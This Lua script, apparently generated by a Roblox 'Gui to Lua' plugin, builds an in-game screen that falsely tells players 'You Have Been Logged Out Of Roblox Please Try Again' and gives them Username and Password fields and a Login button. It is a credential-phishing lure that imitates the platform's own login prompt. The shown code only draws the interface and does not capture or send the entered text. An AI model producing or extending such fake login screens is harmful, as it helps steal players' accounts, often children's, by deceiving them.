-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Login = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local Username = Instance.new("TextBox")
local UICorner_3 = Instance.new("UICorner")
local Username_2 = Instance.new("TextBox")
local UICorner_4 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.269372851, -150, 0.0398009568, 64)
Frame.Size = UDim2.new(0.645325959, 0, 0.75920409, 0)

UICorner.Parent = Frame

Login.Name = "Login"
Login.Parent = Frame
Login.BackgroundColor3 = Color3.fromRGB(54, 54, 54)
Login.BorderColor3 = Color3.fromRGB(0, 0, 0)
Login.BorderSizePixel = 0
Login.Position = UDim2.new(0.215381786, 0, 0.648754895, 0)
Login.Size = UDim2.new(0.568440914, 0, 0.240891129, 0)
Login.Font = Enum.Font.SourceSans
Login.Text = "Login"
Login.TextColor3 = Color3.fromRGB(255, 255, 255)
Login.TextScaled = true
Login.TextSize = 14.000
Login.TextWrapped = true

UICorner_2.Parent = Login

Username.Name = "Username"
Username.Parent = Frame
Username.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
Username.BorderColor3 = Color3.fromRGB(0, 0, 0)
Username.BorderSizePixel = 0
Username.Position = UDim2.new(0.264938563, 0, 0.257208318, 0)
Username.Size = UDim2.new(0.469327211, 0, 0.158977717, 0)
Username.Font = Enum.Font.SourceSans
Username.Text = "Username"
Username.TextColor3 = Color3.fromRGB(255, 255, 255)
Username.TextScaled = true
Username.TextSize = 14.000
Username.TextWrapped = true

UICorner_3.Parent = Username

Username_2.Name = "Username"
Username_2.Parent = Frame
Username_2.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
Username_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Username_2.BorderSizePixel = 0
Username_2.Position = UDim2.new(0.263985842, 0, 0.437417984, 0)
Username_2.Size = UDim2.new(0.469326884, 0, 0.158977702, 0)
Username_2.Font = Enum.Font.SourceSans
Username_2.Text = "Password"
Username_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Username_2.TextScaled = true
Username_2.TextSize = 14.000
Username_2.TextWrapped = true

UICorner_4.Parent = Username_2

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0724294707, 0, 0.0786369517, 0)
TextLabel.Size = UDim2.new(0.852282584, 0, 0.140956745, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "You Have Been Logged Out Of Roblox Please Try Again"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true
